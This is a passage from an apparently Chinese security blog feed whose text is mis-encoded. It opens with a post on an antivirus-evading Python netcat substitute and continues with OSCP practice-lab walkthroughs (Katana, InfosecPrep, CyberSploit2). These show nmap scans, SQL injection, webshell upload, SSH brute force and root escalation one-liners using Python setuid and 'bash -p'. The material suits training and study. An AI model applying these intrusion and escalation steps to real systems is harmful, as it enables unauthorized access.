        <content type="html"><![CDATA[<h1 id="ã€Pythonæ­¦å™¨åº“ã€‘å–ä»£netcatï¼ˆè¿‡æ€è½¯ï¼‰"><a href="#ã€Pythonæ­¦å™¨åº“ã€‘å–ä»£netcatï¼ˆè¿‡æ€è½¯ï¼‰" class="headerlink" title="ã€Pythonæ­¦å™¨åº“ã€‘å–ä»£netcatï¼ˆè¿‡æ€è½¯ï¼‰"></a>ã€Pythonæ­¦å™¨åº“ã€‘å–ä»£netcatï¼ˆè¿‡æ€è½¯ï¼‰</h1><h2 id="ä¸€ã€netcat-ç®€ä»‹"><a href="#ä¸€ã€netcat-ç®€ä»‹" class="headerlink" title="ä¸€ã€netcat ç®€ä»‹"></a>ä¸€ã€netcat ç®€ä»‹</h2><p>ç®€ç§°ncï¼Œè¢«ç§°ä¸ºâ€œç‘å£«å†›åˆ€â€ï¼Œåœ¨ç½‘ç»œå®‰å…¨ä¸­æ˜¯ä¸€ä½ä¸å¯æˆ–ç¼ºçš„è§’è‰²ã€‚ä½†å¦‚æœæ‹¿åˆ°ä¸€å¤ªæ–°çš„æœåŠ¡å™¨ï¼Œå´æ²¡æœ‰ncï¼Œä¹Ÿä¸å…·å¤‡ä¸Šç½‘çš„èƒ½åŠ›ï¼Œæ­¤æ—¶æ€»å½’æ˜¯è®©äººæœ‰äº›æŠ“è€³çš„ã€‚ä½†å¦‚æœæœ‰pythonç¯å¢ƒçš„è¯ï¼Œå´æ˜¯å¯ä»¥æ›¿ä»£ncã€‚æ­¤ä¹Ÿæ˜¯ä¸€ä¸ªä¸é”™çš„ç»ƒä¹ ã€‚</p><h2 id="äºŒã€å®ç°æ•ˆæœ"><a href="#äºŒã€å®ç°æ•ˆæœ" class="headerlink" title="äºŒã€å®ç°æ•ˆæœ"></a>äºŒã€å®ç°æ•ˆæœ</h2><h3 id="1ã€è¿æ¥"><a href="#1ã€è¿æ¥" class="headerlink" title="1ã€è¿æ¥"></a>1ã€è¿æ¥</h3><p><img src="/img/Python-tools-netcat/image-20240530182514012.png" alt="image-20240530182514012"></p><h3 id="2ã€å‘½ä»¤æ‰§è¡Œ"><a href="#2ã€å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="2ã€å‘½ä»¤æ‰§è¡Œ"></a>2ã€å‘½ä»¤æ‰§è¡Œ</h3><p>1ã€åˆ›å»ºæ–‡ä»¶</p><p><img src="/img/Python-tools-netcat/image-20240530182601652.png" alt="image-20240530182601652"></p><p>2ã€åˆ é™¤æ–‡ä»¶</p><p><img src="/img/Python-tools-netcat/image-20240530182729163.png" alt="image-20240530182729163"></p><h2 id="ä¸‰ã€å…æ€æ•ˆæœ"><a href="#ä¸‰ã€å…æ€æ•ˆæœ" class="headerlink" title="ä¸‰ã€å…æ€æ•ˆæœ"></a>ä¸‰ã€å…æ€æ•ˆæœ</h2><p>åŒæ ·çš„è·¯å¾„ï¼Œåªæ‰«æå‡ºæ¥nc</p><p><img src="/img/Python-tools-netcat/image-20240530183318162.png" alt="image-20240530183318162"></p><h2 id="å››ã€å®æˆ˜æ•ˆæœ"><a href="#å››ã€å®æˆ˜æ•ˆæœ" class="headerlink" title="å››ã€å®æˆ˜æ•ˆæœ"></a>å››ã€å®æˆ˜æ•ˆæœ</h2><p><img src="/img/Python-tools-netcat/image-20240530185113153.png" alt="image-20240530185113153"></p><h2 id="äº”ã€ä»£ç å®ç°"><a href="#äº”ã€ä»£ç å®ç°" class="headerlink" title="äº”ã€ä»£ç å®ç°"></a>äº”ã€ä»£ç å®ç°</h2><p>ç”±äºå·¥å…·å±å®³æ€§è¾ƒå¤§ï¼Œè¿™é‡Œåªå±•ç¤ºä»£ç éƒ¨åˆ†ç‰‡æ®µ</p><p><img src="/img/Python-tools-netcat/image-20240531192217502.png" alt="image-20240531192217502"></p><p>æ›´è¯¦ç»†çš„å†…å®¹ï¼Œè¯·å‰å¾€Pythonç¬”è®°ä¸­çš„é¡¹ç›®2</p><p><img src="/img/Python-tools-netcat/image-20240531192300975.png" alt="image-20240531192300975"></p>]]></content>
      
      
      <categories>
          
          <category> Pythonæ­¦å™¨åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> netcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœº-Katana</title>
      <link href="/2024/05/29/OSCP-Katana/"/>
      <url>/2024/05/29/OSCP-Katana/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”Katana"><a href="#ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”Katana" class="headerlink" title="ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”Katana"></a>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”Katana</h1><h2 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h2><p><img src="/img/OSCP-Katana/image-20240529145416227.png" alt="image-20240529145416227"></p><h2 id="äºŒã€ç«¯å£æ‰«æ"><a href="#äºŒã€ç«¯å£æ‰«æ" class="headerlink" title="äºŒã€ç«¯å£æ‰«æ"></a>äºŒã€ç«¯å£æ‰«æ</h2><h3 id="1ã€å¿«é€Ÿæ‰«æ"><a href="#1ã€å¿«é€Ÿæ‰«æ" class="headerlink" title="1ã€å¿«é€Ÿæ‰«æ"></a>1ã€å¿«é€Ÿæ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.57</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Katana/image-20240529145502845.png" alt="image-20240529145502845"></p><h3 id="2ã€å…¨ç«¯å£æ‰«æ"><a href="#2ã€å…¨ç«¯å£æ‰«æ" class="headerlink" title="2ã€å…¨ç«¯å£æ‰«æ"></a>2ã€å…¨ç«¯å£æ‰«æ</h3><p><img src="/img/OSCP-Katana/image-20240529145749652.png" alt="image-20240529145749652"></p><h3 id="3ã€æœåŠ¡ç‰ˆæœ¬è¯†åˆ«"><a href="#3ã€æœåŠ¡ç‰ˆæœ¬è¯†åˆ«" class="headerlink" title="3ã€æœåŠ¡ç‰ˆæœ¬è¯†åˆ«"></a>3ã€æœåŠ¡ç‰ˆæœ¬è¯†åˆ«</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sV -sT -sC -O -p21,22,80,139,445,7080,8715,8088 192.168.31.57</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Katana/image-20240529150206333.png" alt="image-20240529150206333"></p><p><img src="/img/OSCP-Katana/image-20240529150218701.png" alt="image-20240529150218701"></p><p>21ã€22ã€80éƒ½æ˜¯å¸¸è§çš„æœåŠ¡ï¼Œ139ã€445æ˜¯SambaæœåŠ¡ï¼Œç‰ˆæœ¬å·åœ¨3.x-4.xï¼Œ7080 æ˜¯ä¸€ä¸ªhttpsæœåŠ¡ï¼Œ8715ä¹Ÿæ˜¯ä¸€ä¸ªhttpæœåŠ¡</p><h3 id="4ã€æ¼æ´æ¢æµ‹"><a href="#4ã€æ¼æ´æ¢æµ‹" class="headerlink" title="4ã€æ¼æ´æ¢æµ‹"></a>4ã€æ¼æ´æ¢æµ‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe --script=vuln -p21,22,80,139,445,7080,8715,8088 192.168.31.57</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Katana/image-20240529150538337.png" alt="image-20240529150538337"></p><h2 id="ä¸‰ã€FTPä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€FTPä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€FTPä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€FTPä¿¡æ¯æ”¶é›†</h2><p>åˆšæ‰nmap ä¿¡æ¯æ”¶é›†çš„æ—¶å€™ï¼Œftpå¹¶æœªæ˜¾ç¤ºæœªæˆæƒ</p><p><img src="/img/OSCP-Katana/image-20240529153121518.png" alt="image-20240529153121518"></p><p>ç”¨hydra è¿›è¡Œç®€å•çš„å¼±å£ä»¤çˆ†ç ´ï¼Œçˆ†ç ´å¤±è´¥</p><p><img src="/img/OSCP-Katana/image-20240529155142725.png" alt="image-20240529155142725"></p><h2 id="å››ã€HTTPä¿¡æ¯æ”¶é›†"><a href="#å››ã€HTTPä¿¡æ¯æ”¶é›†" class="headerlink" title="å››ã€HTTPä¿¡æ¯æ”¶é›†"></a>å››ã€HTTPä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€80ç«¯å£é¦–é¡µ"><a href="#1ã€80ç«¯å£é¦–é¡µ" class="headerlink" title="1ã€80ç«¯å£é¦–é¡µ"></a>1ã€80ç«¯å£é¦–é¡µ</h3><p>æ˜¯ä¸€ä¸ªæ­¦å£«å†›åˆ€</p><p><img src="/img/OSCP-Katana/image-20240529155317401.png" alt="image-20240529155317401"></p><h3 id="2ã€ç›®å½•æ‰«æ"><a href="#2ã€ç›®å½•æ‰«æ" class="headerlink" title="2ã€ç›®å½•æ‰«æ"></a>2ã€ç›®å½•æ‰«æ</h3><p>å•¥ä¹Ÿæ²¡æœ‰</p><p><img src="/img/OSCP-Katana/image-20240529160141608.png" alt="image-20240529160141608"></p><p>ä¸Šå…¶ä»–å­—å…¸ï¼Œæ‰«åˆ°<code>ebook</code></p><p><img src="/img/OSCP-Katana/image-20240529160854898.png" alt="image-20240529160854898"></p><p>æœ‰å…¶ä»–ä¸œè¥¿äº†</p><p><img src="/img/OSCP-Katana/image-20240529160931617.png" alt="image-20240529160931617"></p><p>çœ‹èµ·æ¥åƒæ˜¯ä¸€ä¸ªCMSç±»å‹ç½‘ç«™ï¼Œç»§ç»­æ‰«</p><h3 id="3ã€admin-php"><a href="#3ã€admin-php" class="headerlink" title="3ã€admin.php"></a>3ã€admin.php</h3><p>åƒæ˜¯åå°ç™»é™†é¡µ</p><p><img src="/img/OSCP-Katana/image-20240529161453013.png" alt="image-20240529161453013"></p><h3 id="4ã€info-php"><a href="#4ã€info-php" class="headerlink" title="4ã€info.php"></a>4ã€info.php</h3><p><code>phpinfo</code>é¡µé¢</p><p><img src="/img/OSCP-Katana/image-20240529161520241.png" alt="image-20240529161520241"></p><h3 id="5ã€SQLæ³¨å…¥æ¼æ´"><a href="#5ã€SQLæ³¨å…¥æ¼æ´" class="headerlink" title="5ã€SQLæ³¨å…¥æ¼æ´"></a>5ã€SQLæ³¨å…¥æ¼æ´</h3><p><img src="/img/OSCP-Katana/image-20240529162025721.png" alt="image-20240529162025721"></p><p>è¿™é‡Œç”¨sqlmap è·‘ï¼Œå°±ä¸æ‰‹å·¥äº†</p><p><img src="/img/OSCP-Katana/image-20240529162118318.png" alt="image-20240529162118318"></p><p>ç»“æœéå¸¸å¦™ï¼Œæ•°æ®åº“ç¿»æ‰¾è´¦å·å¯†ç </p><p><img src="/img/OSCP-Katana/image-20240529162425561.png" alt="image-20240529162425561"></p><p>æ˜‚ã€‚ã€‚ã€‚è´¦å·å¯†ç è¿™ä¹ˆè‰ç‡å—ï¼Ÿ<code>admin:admin</code>ç™»é™†åå°</p><p><img src="/img/OSCP-Katana/image-20240529162538091.png" alt="image-20240529162538091"></p><h3 id="6ã€æ–‡ä»¶ä¸Šä¼ ï¼ˆå¤±è´¥ï¼‰"><a href="#6ã€æ–‡ä»¶ä¸Šä¼ ï¼ˆå¤±è´¥ï¼‰" class="headerlink" title="6ã€æ–‡ä»¶ä¸Šä¼ ï¼ˆå¤±è´¥ï¼‰"></a>6ã€æ–‡ä»¶ä¸Šä¼ ï¼ˆå¤±è´¥ï¼‰</h3><p>åœ¨ä¿®æ”¹å•†å“çš„åœ°æ–¹ï¼Œå­˜åœ¨å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½ï¼Œè¿™é‡Œæˆ–è®¸å­˜åœ¨æ–‡ä»¶ä¸Šä¼ </p><p><img src="/img/OSCP-Katana/image-20240529162758380.png" alt="image-20240529162758380"></p><p>åˆ°å‰å°çœ‹äº†ä¸€ä¸‹å›¾ç‰‡çš„è·¯å¾„åœ¨ï¼š<code>/ebook/bootstrap/img/mobile_app.jpg</code></p><p><img src="/img/OSCP-Katana/image-20240529162843618.png" alt="image-20240529162843618"></p><p>å°è¯•æ–‡ä»¶ä¸Šä¼ </p><p><img src="/img/OSCP-Katana/image-20240529165506341.png" alt="image-20240529165506341"></p><p>ä¸Šä¼ å¤±è´¥ï¼Œä¸€åº¦ç–‘ä¼¼æ¡ä»¶ç«äº‰ï¼ŒæŠ˜è…¾äº†è€å¤§ä¼šå„¿ï¼Œå‡å¤±è´¥äº†</p><h3 id="7ã€è½¬å‘8088ç«¯å£"><a href="#7ã€è½¬å‘8088ç«¯å£" class="headerlink" title="7ã€è½¬å‘8088ç«¯å£"></a>7ã€è½¬å‘8088ç«¯å£</h3><p>ç›®å½•æ‰«æ</p><p><img src="/img/OSCP-Katana/image-20240529165835076.png" alt="image-20240529165835076"></p><h3 id="8ã€æ–‡ä»¶ä¸Šä¼ "><a href="#8ã€æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="8ã€æ–‡ä»¶ä¸Šä¼ "></a>8ã€æ–‡ä»¶ä¸Šä¼ </h3><p>ä¸ä¼šåˆä¸€ä¸ªå¤±è´¥çš„å§ï¼Œå°è¯•ä¸€ä¸‹</p><p><img src="/img/OSCP-Katana/image-20240529165929512.png" alt="image-20240529165929512"></p><p>æœ‰ä¸¤ä¸ªä¸Šä¼ ç‚¹ï¼Œä¸Šä¼ äº†ä¸€ä¸ªæ­£å¸¸å›¾ç‰‡å’Œä¸€ä¸ªæ¶æ„å›¾ç‰‡</p><p><img src="/img/OSCP-Katana/image-20240529170322832.png" alt="image-20240529170322832"></p><p>ä¸Šä¼ æˆåŠŸäº†ï¼Œä½†æ˜¯ç§»åŠ¨åˆ°äº†å…¶ä»–åœ°æ–¹ï¼Œä¸è¿‡è¿™ä¸ªåœ°æ–¹ä¾ç„¶åƒwebæœåŠ¡çš„æ ¹ç›®å½•</p><p><img src="/img/OSCP-Katana/image-20240529170406689.png" alt="image-20240529170406689"></p><p>æ²¡æƒ³åˆ°åœ¨<code>8715</code>ç«¯å£çš„æ ¹ç›®å½•ä¸‹å‘ç°è¿™å¼ å›¾ç‰‡ï¼Œé‚£è¿™å°±å¥½åŠäº†</p><h2 id="äº”ã€Getshell"><a href="#äº”ã€Getshell" class="headerlink" title="äº”ã€Getshell"></a>äº”ã€Getshell</h2><p>æˆ‘ä»¬åœ¨8088ç«¯å£ä¸Šä¼ webshell</p><p><img src="/img/OSCP-Katana/image-20240529170529155.png" alt="image-20240529170529155"></p><p>æç¤ºæŠ¥é”™ï¼Œä½†æ˜¯æ–‡ä»¶ä¼¼ä¹ä¾ç„¶ç§»åŠ¨è¿‡å»äº†ï¼Œèšå‰‘è¯•è¯•</p><p><img src="/img/OSCP-Katana/image-20240529170654718.png" alt="image-20240529170654718"></p><p>è¿æ¥æˆåŠŸï¼ŒåŒæ—¶ï¼Œæˆ‘ä»¬å°†shellè½¬ç§»è‡³ncã€‚æ–¹æ³•å¾ˆå¤šï¼Œè¿™é‡Œå°±ä¸å±•ç¤ºäº†</p><h2 id="å…­ã€æƒé™æå‡"><a href="#å…­ã€æƒé™æå‡" class="headerlink" title="å…­ã€æƒé™æå‡"></a>å…­ã€æƒé™æå‡</h2><h3 id="1ã€-etc-passwd-æ–‡ä»¶"><a href="#1ã€-etc-passwd-æ–‡ä»¶" class="headerlink" title="1ã€&#x2F;etc&#x2F;passwd æ–‡ä»¶"></a>1ã€&#x2F;etc&#x2F;passwd æ–‡ä»¶</h3><p><img src="/img/OSCP-Katana/image-20240529171450269.png" alt="image-20240529171450269"></p><p>æ˜‚ã€‚ï¼Ÿçˆ†ç ´äº†å¤šå¤§ä¼šï¼Œä¸€ç›´å‡ºä¸æ¥ï¼Œå…ˆæ‰¾å…¶ä»–ææƒæ–¹æ³•</p><h3 id="2ã€getcapæŸ¥çœ‹æƒé™"><a href="#2ã€getcapæŸ¥çœ‹æƒé™" class="headerlink" title="2ã€getcapæŸ¥çœ‹æƒé™"></a>2ã€getcapæŸ¥çœ‹æƒé™</h3><p><img src="/img/OSCP-Katana/image-20240529173805547.png" alt="image-20240529173805547"></p><p>æœ‰python</p><p>é‚£ç›´æ¥ä¸€å¥è¯ææƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Katana/image-20240529173844328.png" alt="image-20240529173844328"></p>]]></content>
      
      
      <categories>
          
          <category> OSCPç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœº-InfosecPrep</title>
      <link href="/2024/05/28/OSCP-InfosecPrep/"/>
      <url>/2024/05/28/OSCP-InfosecPrep/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCPç³»åˆ—é¶æœºâ€”InfosecPrep"><a href="#OSCPç³»åˆ—é¶æœºâ€”InfosecPrep" class="headerlink" title="OSCPç³»åˆ—é¶æœºâ€”InfosecPrep"></a>OSCPç³»åˆ—é¶æœºâ€”InfosecPrep</h1><h2 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h2><p><img src="/img/OSCP-InfosecPrep/image-20240527204548647.png" alt="image-20240527204548647"></p><h2 id="äºŒã€ç«¯å£æ‰«æ"><a href="#äºŒã€ç«¯å£æ‰«æ" class="headerlink" title="äºŒã€ç«¯å£æ‰«æ"></a>äºŒã€ç«¯å£æ‰«æ</h2><h3 id="1ã€å¿«é€Ÿæ‰«æ"><a href="#1ã€å¿«é€Ÿæ‰«æ" class="headerlink" title="1ã€å¿«é€Ÿæ‰«æ"></a>1ã€å¿«é€Ÿæ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.56</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-InfosecPrep/image-20240527204618888.png" alt="image-20240527204618888"></p><h3 id="2ã€å…¨ç«¯å£æ‰«æ"><a href="#2ã€å…¨ç«¯å£æ‰«æ" class="headerlink" title="2ã€å…¨ç«¯å£æ‰«æ"></a>2ã€å…¨ç«¯å£æ‰«æ</h3><p><img src="/img/OSCP-InfosecPrep/image-20240527204858405.png" alt="image-20240527204858405"></p><h3 id="3ã€æœåŠ¡ç‰ˆæœ¬è¯†åˆ«"><a href="#3ã€æœåŠ¡ç‰ˆæœ¬è¯†åˆ«" class="headerlink" title="3ã€æœåŠ¡ç‰ˆæœ¬è¯†åˆ«"></a>3ã€æœåŠ¡ç‰ˆæœ¬è¯†åˆ«</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sV -sT -sC -O -p 22,80,33060 192.168.31.56</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-InfosecPrep/image-20240527204938650.png" alt="image-20240527204938650"></p><p>22ç«¯å£é‡‡ç”¨<code>OpenSSH 8.1</code>ç‰ˆæœ¬ï¼Œ80ç«¯å£ä½¿ç”¨<code>Apache/2.4.41</code>ï¼Œå‘ç°<code>secret.txt</code> æ–‡ä»¶ï¼Œ33060ä½¿ç”¨<code>mysql</code>çš„æŸä¸ªç‰ˆæœ¬ã€‚</p><p>æ•´ä¸ªæœºå™¨ä½¿ç”¨Ubuntuï¼Œç³»ç»Ÿç‰ˆæœ¬åœ¨<code>4.15 - 5.8</code></p><h3 id="4ã€æ¼æ´æ¢æµ‹"><a href="#4ã€æ¼æ´æ¢æµ‹" class="headerlink" title="4ã€æ¼æ´æ¢æµ‹"></a>4ã€æ¼æ´æ¢æµ‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe --script=vuln -p22,80,33060 192.168.31.56</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-InfosecPrep/image-20240527205325618.png" alt="image-20240527205325618"></p><p>80ç«¯å£ä½¿ç”¨<code>wordpress</code>æ¡†æ¶ï¼Œå‘ç°ç”¨æˆ·å<code>admin</code>ï¼Œå‘ç°ä¸€äº›csrf æ¼æ´å’Œè¿›è¡Œäº†ä¸€äº›ç›®å½•æ‰«æ</p><h2 id="ä¸‰ã€HTTP-ä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€HTTP-ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€HTTP ä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€HTTP ä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€é¦–é¡µ"><a href="#1ã€é¦–é¡µ" class="headerlink" title="1ã€é¦–é¡µ"></a>1ã€é¦–é¡µ</h3><p>ä¸€ä¸ªwordpress ç½‘ç«™</p><p><img src="/img/OSCP-InfosecPrep/image-20240527205611390.png" alt="image-20240527205611390"></p><h3 id="2ã€robots-txt-æ–‡ä»¶"><a href="#2ã€robots-txt-æ–‡ä»¶" class="headerlink" title="2ã€robots.txt æ–‡ä»¶"></a>2ã€robots.txt æ–‡ä»¶</h3><p><img src="/img/OSCP-InfosecPrep/image-20240527205658116.png" alt="image-20240527205658116"></p><h3 id="3ã€secret-txt-æ–‡ä»¶"><a href="#3ã€secret-txt-æ–‡ä»¶" class="headerlink" title="3ã€secret.txt æ–‡ä»¶"></a>3ã€secret.txt æ–‡ä»¶</h3><p>è¿™ä¸ªä¸œè¥¿ï¼Œæœ‰ç‚¹åƒRSAå¯†é’¥ï¼Œä½†æ˜¯å¥½åƒè¢«base64åŠ å¯†äº†</p><p><img src="/img/OSCP-InfosecPrep/image-20240527205719333.png" alt="image-20240527205719333"></p><p>base64è§£å¯†ä¸€ä¸‹</p><p><img src="/img/OSCP-InfosecPrep/image-20240527205915821.png" alt="image-20240527205915821"></p><p>è¿™ä¸‹æ­£å®—äº†ï¼Œç¡®è®¤æ˜¯æŸä¸ªç”¨æˆ·çš„RSAå¯†é’¥ï¼Œä¿å­˜èµ·æ¥</p><h2 id="å››ã€Getshell"><a href="#å››ã€Getshell" class="headerlink" title="å››ã€Getshell"></a>å››ã€Getshell</h2><p>åé¢æ”¶é›†äº†å¾ˆå¤šä¿¡æ¯ï¼Œå‡æ— æœï¼Œé‡æ–°å›å½’HTTP ï¼Œä¾æ¬¡æŸ¥çœ‹ç½‘é¡µä¸Šæœ‰æ— ä¿¡æ¯</p><p><img src="/img/OSCP-InfosecPrep/image-20240527215930920.png" alt="image-20240527215930920"></p><p>æœç„¶ï¼Œåœ¨é¦–é¡µå°±å·²ç»ç»™äº†ç”¨æˆ·å<code>oscp</code>äº†</p><p><img src="/img/OSCP-InfosecPrep/image-20240527220357448.png" alt="image-20240527220357448"></p><h2 id="äº”ã€æƒé™æå‡"><a href="#äº”ã€æƒé™æå‡" class="headerlink" title="äº”ã€æƒé™æå‡"></a>äº”ã€æƒé™æå‡</h2><p>æŸ¥çœ‹SUID æ–‡ä»¶</p><p><img src="/img/OSCP-InfosecPrep/image-20240528143312921.png" alt="image-20240528143312921"></p><p>å—¯ï¼Ÿä¸ä¼šå§</p><p>ç›´æ¥ <code>bash -p</code>ææƒåˆ°root</p><p><img src="/img/OSCP-InfosecPrep/image-20240528143522608.png" alt="image-20240528143522608"></p>]]></content>
      
      
      <categories>
          
          <category> OSCPç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœºâ€”CyberSploit2</title>
      <link href="/2024/05/27/OSCP-cybersploit-2/"/>
      <url>/2024/05/27/OSCP-cybersploit-2/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCPç³»åˆ—é¶æœºâ€”CyberSploit2"><a href="#OSCPç³»åˆ—é¶æœºâ€”CyberSploit2" class="headerlink" title="OSCPç³»åˆ—é¶æœºâ€”CyberSploit2"></a>OSCPç³»åˆ—é¶æœºâ€”CyberSploit2</h1><h2 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h2><p><img src="/img/OSCP-cybersploit-2/image-20240527140325772.png" alt="image-20240527140325772"></p><h2 id="äºŒã€ç«¯å£æ‰«æ"><a href="#äºŒã€ç«¯å£æ‰«æ" class="headerlink" title="äºŒã€ç«¯å£æ‰«æ"></a>äºŒã€ç«¯å£æ‰«æ</h2><h3 id="1ã€å¿«é€Ÿæ‰«æ"><a href="#1ã€å¿«é€Ÿæ‰«æ" class="headerlink" title="1ã€å¿«é€Ÿæ‰«æ"></a>1ã€å¿«é€Ÿæ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.55</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-cybersploit-2/image-20240527140404327.png" alt="image-20240527140404327"></p><h3 id="2ã€å…¨ç«¯å£æ‰«æ"><a href="#2ã€å…¨ç«¯å£æ‰«æ" class="headerlink" title="2ã€å…¨ç«¯å£æ‰«æ"></a>2ã€å…¨ç«¯å£æ‰«æ</h3><p><img src="/img/OSCP-cybersploit-2/image-20240527140703535.png" alt="image-20240527140703535"></p><h3 id="3ã€æœåŠ¡ç‰ˆæœ¬è¯†åˆ«"><a href="#3ã€æœåŠ¡ç‰ˆæœ¬è¯†åˆ«" class="headerlink" title="3ã€æœåŠ¡ç‰ˆæœ¬è¯†åˆ«"></a>3ã€æœåŠ¡ç‰ˆæœ¬è¯†åˆ«</h3><p><img src="/img/OSCP-cybersploit-2/image-20240527140616869.png" alt="image-20240527140616869"></p><p>22ç«¯å£ä½¿ç”¨OpenSSH 8.0ç‰ˆæœ¬ï¼Œ80ç«¯å£ä½¿ç”¨ApacheæœåŠ¡ï¼Œæ¨æµ‹ä¸ºcentosç³»ç»Ÿ</p><h3 id="4ã€æ¼æ´æ¢æµ‹"><a href="#4ã€æ¼æ´æ¢æµ‹" class="headerlink" title="4ã€æ¼æ´æ¢æµ‹"></a>4ã€æ¼æ´æ¢æµ‹</h3><p><img src="/img/OSCP-cybersploit-2/image-20240527140711290.png" alt="image-20240527140711290"></p><p>80ç«¯å£æ¢æµ‹åˆ°ä¸€ä¸ª<code>icons</code>ç›®å½•</p><h2 id="ä¸‰ã€HTTP-ä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€HTTP-ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€HTTP ä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€HTTP ä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€é¦–é¡µ"><a href="#1ã€é¦–é¡µ" class="headerlink" title="1ã€é¦–é¡µ"></a>1ã€é¦–é¡µ</h3><p>é¦–é¡µä¼¼ä¹ç»™äº†å‡ ä¸ªè´¦æˆ·åå’Œå¯†ç ï¼Œæ”¶é›†èµ·æ¥</p><p><img src="/img/OSCP-cybersploit-2/image-20240527141100852.png" alt="image-20240527141100852"></p><h3 id="2ã€é¡µé¢æºä»£ç "><a href="#2ã€é¡µé¢æºä»£ç " class="headerlink" title="2ã€é¡µé¢æºä»£ç "></a>2ã€é¡µé¢æºä»£ç </h3><p>ç»™äº†ä¸€ä¸ª<code>ROT47</code>çš„æç¤º</p><p><img src="/img/OSCP-cybersploit-2/image-20240527141305575.png" alt="image-20240527141305575"></p><p>æ¨æµ‹è´¦å·å¯†ç ä¸­<code>D92:=6?5C2 4J36CDA=@:E</code>æ˜¯ä¸€ç»„è¢«ç¼–ç çš„æ•°å€¼ï¼Œè§£ç æˆåŠŸ</p><p><img src="/img/OSCP-cybersploit-2/image-20240527141614118.png" alt="image-20240527141614118"></p><h2 id="å››ã€è·å–SHELL"><a href="#å››ã€è·å–SHELL" class="headerlink" title="å››ã€è·å–SHELL"></a>å››ã€è·å–SHELL</h2><p>å¯¹æ”¶é›†çš„è´¦å·å¯†ç åšæˆå­—å…¸ï¼Œè¿›è¡Œsshçˆ†ç ´</p><p><img src="/img/OSCP-cybersploit-2/image-20240527142240215.png" alt="image-20240527142240215"></p><p>æˆåŠŸè·å–<code>shailendra</code>ç”¨æˆ·çš„æƒé™</p><p><img src="/img/OSCP-cybersploit-2/image-20240527142537822.png" alt="image-20240527142537822"></p><h2 id="äº”ã€æƒé™æå‡"><a href="#äº”ã€æƒé™æå‡" class="headerlink" title="äº”ã€æƒé™æå‡"></a>äº”ã€æƒé™æå‡</h2><h3 id="1ã€æŸ¥çœ‹-etc-passwd"><a href="#1ã€æŸ¥çœ‹-etc-passwd" class="headerlink" 